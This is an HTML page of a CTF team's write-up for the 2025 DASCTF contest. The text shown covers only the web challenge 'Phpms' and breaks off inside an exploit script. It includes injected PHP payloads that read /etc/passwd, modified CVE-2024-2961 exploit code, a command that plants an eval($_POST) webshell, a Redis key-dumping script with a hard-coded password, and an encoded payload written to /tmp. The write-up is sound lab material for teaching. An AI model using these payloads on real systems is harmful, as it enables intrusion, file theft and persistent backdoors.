<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2025 DASCTF上半年赛 SU WriteUp - su-team</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="su-team"><meta name="msapplication-TileImage" content="/img/SU4.jpg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="su-team"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="感谢 08067Sec 的师傅们精心准备的比赛！本次DASCTF我们 SU 取得了第一名 的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。 以下是我们 SU 本次 2025 DASCTF 上半年赛的 部分writeup以及赛后解出的部分题目。"><meta property="og:type" content="blog"><meta property="og:title" content="2025 DASCTF上半年赛 SU WriteUp"><meta property="og:url" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/"><meta property="og:site_name" content="su-team"><meta property="og:description" content="感谢 08067Sec 的师傅们精心准备的比赛！本次DASCTF我们 SU 取得了第一名 的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。 以下是我们 SU 本次 2025 DASCTF 上半年赛的 部分writeup以及赛后解出的部分题目。"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/QQ20250621-212945.jpg"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/fb9dd69d-4af3-469c-adad-31e922d4d2ac.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/01279d99-7aaa-4fbe-b3f8-8c406ecf39e4.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/33618614-7e91-4c5f-a7d4-055098b8a52f.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/fd147174-057a-4b4e-b7c2-c19fad4ce93a.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/7a0a5ddc-f7e4-4136-a343-baa4fbe15438.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/604fb2fb-2908-4fa7-84b1-5d95d5a7ee69.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/a0b85729-7f2a-4fb2-9920-5a9135aa631a.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/6b95853a-1064-4cec-b6e9-49d61a22f66d.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/6135bd3f-db5e-436d-87cb-603e8139a4c1.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/26764c97-ca32-4fdf-8663-1181593712d9.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/3c888a6d-f36e-43ef-b53a-85a8d18181de.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/2e926d28-f8fc-4254-957f-be28978ff2f6.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/d78b73c2-3401-40e4-bc31-0384887b9250.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/d10d1d52-b2ec-4fd6-81c9-4785a7028753.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/8e853000-f963-4e15-8f83-b8a3275b16d4.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/89855f6a-481a-427e-81ad-63ec6883d3f2.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/8312ebfa-6b66-4a8e-a565-57b42f3575ca.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/90840edc-856b-4c9c-b041-35f1cc01a6c0.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/6b02f1ab-2046-415d-907b-1c4bfa227df5.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/18193d0b-9fd9-4ec0-97e1-a2cd1c284fc3.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/52464938-efca-4ecb-926e-459e1644ac83.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/e96f1a83-4c5a-4528-ae97-133dfd00956b.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/ade9d6f8-05b9-45bf-95f7-111d4196fdfb.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/3b0f6c59-984f-48fa-9cb7-f8d25f7482c1.png"><meta property="og:image" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/9612a3b1-cd10-43a3-a19c-77e48c3c8c5e.png"><meta property="article:published_time" content="2025-06-21T13:29:17.000Z"><meta property="article:modified_time" content="2025-06-22T02:07:13.849Z"><meta property="article:author" content="SUers"><meta property="article:tag" content="DASCTF"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/QQ20250621-212945.jpg"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/"},"headline":"2025 DASCTF上半年赛 SU WriteUp","image":["https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/QQ20250621-212945.jpg","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/fb9dd69d-4af3-469c-adad-31e922d4d2ac.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/01279d99-7aaa-4fbe-b3f8-8c406ecf39e4.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/33618614-7e91-4c5f-a7d4-055098b8a52f.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/fd147174-057a-4b4e-b7c2-c19fad4ce93a.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/7a0a5ddc-f7e4-4136-a343-baa4fbe15438.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/604fb2fb-2908-4fa7-84b1-5d95d5a7ee69.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/a0b85729-7f2a-4fb2-9920-5a9135aa631a.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/6b95853a-1064-4cec-b6e9-49d61a22f66d.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/6135bd3f-db5e-436d-87cb-603e8139a4c1.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/26764c97-ca32-4fdf-8663-1181593712d9.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/3c888a6d-f36e-43ef-b53a-85a8d18181de.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/2e926d28-f8fc-4254-957f-be28978ff2f6.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/d78b73c2-3401-40e4-bc31-0384887b9250.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/d10d1d52-b2ec-4fd6-81c9-4785a7028753.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/8e853000-f963-4e15-8f83-b8a3275b16d4.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/89855f6a-481a-427e-81ad-63ec6883d3f2.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/8312ebfa-6b66-4a8e-a565-57b42f3575ca.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/90840edc-856b-4c9c-b041-35f1cc01a6c0.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/6b02f1ab-2046-415d-907b-1c4bfa227df5.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/18193d0b-9fd9-4ec0-97e1-a2cd1c284fc3.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/52464938-efca-4ecb-926e-459e1644ac83.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/e96f1a83-4c5a-4528-ae97-133dfd00956b.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/ade9d6f8-05b9-45bf-95f7-111d4196fdfb.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/3b0f6c59-984f-48fa-9cb7-f8d25f7482c1.png","https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/9612a3b1-cd10-43a3-a19c-77e48c3c8c5e.png"],"datePublished":"2025-06-21T13:29:17.000Z","dateModified":"2025-06-22T02:07:13.849Z","author":{"@type":"Person","name":"SUers"},"publisher":{"@type":"Organization","name":"su-team","logo":{"@type":"ImageObject","url":"https://team-su.github.io/img/SU4.jpg"}},"description":"感谢 08067Sec 的师傅们精心准备的比赛！本次DASCTF我们 SU 取得了第一名 的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：suers_xctf@126.com 或者直接联系baozongwi QQ:2405758945。 以下是我们 SU 本次 2025 DASCTF 上半年赛的 部分writeup以及赛后解出的部分题目。"}</script><link rel="canonical" href="https://team-su.github.io/2025/06/21/2025-DASCTF%E4%B8%8A%E5%8D%8A%E5%B9%B4/"><link rel="alternate" href="/atom.xml" title="su-team" type="application/atom+xml"><link rel="icon" href="/img/SU4.jpg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/SU4.jpg" alt="su-team" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a><a class="navbar-item" href="/members">Members</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/team-su"><i class="fab fa-github"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="RSS Feed" href="/atom.xml"><i class="fas fa-rss"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2025-06-21T13:29:17.000Z" title="2025/6/21 21:29:17">2025-06-21</time></span><span class="level-item">Updated&nbsp;<time dateTime="2025-06-22T02:07:13.849Z" title="2025/6/22 10:07:13">2025-06-22</time></span><span class="level-item">an hour read (About 8590 words)</span></div></div><h1 class="title is-3 is-size-4-mobile">2025 DASCTF上半年赛 SU WriteUp</h1><div class="content"><p>感谢 08067Sec 的师傅们精心准备的比赛！本次DASCTF我们 SU 取得了第一名 的好成绩，感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：<a href="mailto:&#115;&#117;&#101;&#x72;&#115;&#x5f;&#x78;&#99;&#116;&#x66;&#64;&#x31;&#50;&#x36;&#x2e;&#99;&#x6f;&#109;">suers_xctf@126.com</a> 或者直接联系baozongwi QQ:2405758945。</p>
<p>以下是我们 SU 本次 2025 DASCTF 上半年赛的 部分writeup以及赛后解出的部分题目。</p>
<span id="more"></span>

<hr>
<p>感谢 08067Sec 的师傅们精心准备的比赛！本次DASCTF我们 SU 取得了第一名 的好成绩</p>
<p><img src="./QQ20250621-212945.jpg" alt="img"></p>
<p>感谢队里师傅们的辛苦付出！同时我们也在持续招人，欢迎发送个人简介至：<a href="mailto:&#115;&#x75;&#101;&#114;&#x73;&#x5f;&#x78;&#99;&#x74;&#102;&#64;&#x31;&#x32;&#54;&#46;&#99;&#111;&#109;">suers_xctf@126.com</a> 或者直接联系baozongwi QQ:2405758945。<br>以下是我们 SU 本次 2025 DASCTF 上半年赛的 部分writeup以及赛后解出的部分题目。</p>
<div class="toc">

<!-- toc -->

<ul>
<li><a href="#web">Web</a><ul>
<li><a href="#phpms-sai-hou">Phpms（赛后）</a></li>
<li><a href="#ze-xi-dao-sai-hou">泽西岛（赛后）</a></li>
</ul>
</li>
<li><a href="#misc">Misc</a><ul>
<li><a href="#bluetrace">BlueTrace</a></li>
<li><a href="#webshell-plus">Webshell Plus</a></li>
</ul>
</li>
<li><a href="#pwn">Pwn</a><ul>
<li><a href="#mini">mini</a></li>
<li><a href="#nsusserver">NSUSServer</a></li>
</ul>
</li>
<li><a href="#crypto">Crypto</a><ul>
<li><a href="#excessive-security">Excessive Security</a></li>
<li><a href="#strange-rsa">Strange RSA</a></li>
</ul>
</li>
<li><a href="#reverse">Reverse</a><ul>
<li><a href="#xuans">xuans</a></li>
<li><a href="#yu-yin-le">鱼音乐</a></li>
<li><a href="#geng-gua-he-ctf-bao-bao-ti-zhi-de-app">更适合CTF宝宝体质的app</a></li>
</ul>
</li>
</ul>
<!-- tocstop -->

</div>

<h1><span id="web">Web</span><a href="#web" class="header-anchor"></a></h1><h2><span id="phpms-sai-hou">Phpms（赛后）</span><a href="#phpms-sai-hou" class="header-anchor"></a></h2><p>扫描出git，进行git恢复</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://123154c5-c64a-427f-b8cf-be5127016c3a.node5.buuoj.cn:81/ --threads 3 --delay 2</span><br><span class="line"></span><br><span class="line">githacker --url http://123154c5-c64a-427f-b8cf-be5127016c3a.node5.buuoj.cn/.git/ --output-folder test --delay 2 --threads 3</span><br><span class="line"></span><br><span class="line">git log --oneline</span><br><span class="line">git show 613dea6</span><br><span class="line"></span><br><span class="line">git stash list</span><br><span class="line">git stash show -p</span><br></pre></td></tr></table></figure>

<p><img src="./fb9dd69d-4af3-469c-adad-31e922d4d2ac.png" alt="img"></p>
<p>发现php基础函数都不存在，只有原生类，现在可以列出目录以及读取一些有权限的文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?shell=?&gt;&lt;?php $content=new SplFileObject(&#x27;no_careee.php&#x27;);foreach($content as $content)&#123;echo $content.&quot;&lt;br&gt;&quot;;&#125;?&gt;</span><br><span class="line">?shell=?&gt;&lt;?php $content=new SplFileObject(&#x27;/etc/passwd&#x27;);foreach($content as $content)&#123;echo $content.&quot;&lt;br&gt;&quot;;&#125;?&gt;</span><br><span class="line"></span><br><span class="line">?shell=?&gt;&lt;?php $a = new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27;&lt;br&gt;&#x27;);&#125;</span><br></pre></td></tr></table></figure>

<p>可以打CVE-2024-2961，修改exp关键部分</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">send</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; Response:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Sends given `path` to the HTTP server. Returns the response.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    payload = <span class="string">f&quot;?shell=?&gt;&lt;?php $content=new SplFileObject(&#x27;<span class="subst">&#123;path&#125;</span>&#x27;);foreach($content as $line)echo $line;?&gt;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">self</span>.session.get(<span class="variable language_">self</span>.url + payload)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns the contents of a remote file.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    path = <span class="string">f&quot;php://filter/convert.base64-encode/resource=<span class="subst">&#123;path&#125;</span>&quot;</span></span><br><span class="line">    response = <span class="variable language_">self</span>.send(path)</span><br><span class="line">    data = response.re.search(<span class="string">b&quot;(.*)&quot;</span>, flags=re.S).group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> base64.decode(data)</span><br></pre></td></tr></table></figure>

<p>执行命令</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 cnext-exploit.py http://08b32553-2ead-<span class="number">4148</span>-8ae2-246361272c33.node5.buuoj.cn:<span class="number">81</span>/ <span class="string">&quot;echo &#x27;&lt;?php @eval(\$_POST[1]);?&gt;&#x27; &gt; 1.php&quot;</span></span><br></pre></td></tr></table></figure>

<p>没成功，换了一个项目来尝试，<a href="https://github.com/kezibei/php-filter-iconv">https://github.com/kezibei/php-filter-iconv</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/proc/<span class="variable language_">self</span>/maps</span><br><span class="line">得到</span><br><span class="line">/lib/x86_64-linux-gnu/libc-<span class="number">2.31</span>.so</span><br></pre></td></tr></table></figure>

<p>然后修改exp</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">maps_path = <span class="string">&#x27;./maps&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;echo 1 &gt; /tmp/1.txt&#x27;</span></span><br><span class="line">sleep_time = 1</span><br><span class="line">padding = 20</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> not os.path.exists(maps_path):</span><br><span class="line">    <span class="built_in">exit</span>(<span class="string">&quot;[-]no maps file&quot;</span>)</span><br><span class="line"></span><br><span class="line">regions = get_regions(maps_path)</span><br><span class="line">heap, libc_info = get_symbols_and_addresses(regions)</span><br><span class="line"></span><br><span class="line">libc_path = libc_info.path</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*]download: &quot;</span>+libc_path)</span><br><span class="line"></span><br><span class="line">libc_path = <span class="string">&#x27;./libc-2.31.so&#x27;</span></span><br><span class="line"><span class="keyword">if</span> not os.path.exists(libc_path):</span><br><span class="line">    <span class="built_in">exit</span>(<span class="string">&quot;[-]no libc file&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>成功了，分段写入sh准备和Redis交互</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">h=127.0.0.1;p=6379;a=admin123</span><br><span class="line">k=$(redis-cli -h <span class="variable">$h</span> -p <span class="variable">$p</span> -a <span class="variable">$a</span> --raw KEYS <span class="string">&#x27;*&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="variable">$k</span>;<span class="keyword">do</span></span><br><span class="line"> v=$(redis-cli -h <span class="variable">$h</span> -p <span class="variable">$p</span> -a <span class="variable">$a</span> --raw GET <span class="variable">$x</span>)</span><br><span class="line"> <span class="built_in">echo</span> <span class="variable">$x</span>=&gt;<span class="variable">$v</span>&gt;/tmp/2.txt</span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>处理压缩，避免长度超过</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gzip -c 1.sh | <span class="built_in">base64</span> -w 0</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> H4sICAOuVmgAAzEuc2gAjcuxCoMwGEXhPU9xS3+wFmKqQqVI3KRDx3bpGI2SYE2CivXx6yOUs3zLOR5EY51o1GyYkWlWJJe9tAzymhe3UkmlR+vSLGeDpNPUaTvz9mPBDciAB1AAVyAFzif1xaN+PxGdo5j1fsIG60BDqT3D+td/r1+gLWboWuN3yYrWSixjEFmybAvT3nXsBzLb30e1AAAA | <span class="built_in">base64</span> -d | gzip -d &gt; /tmp/1.sh</span><br></pre></td></tr></table></figure>

<p>最后发现maps和libc和动态的，所以和出题人@L1mbo交流，并且要到了exp，自己修改了一下，害的是一把锁啊</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span 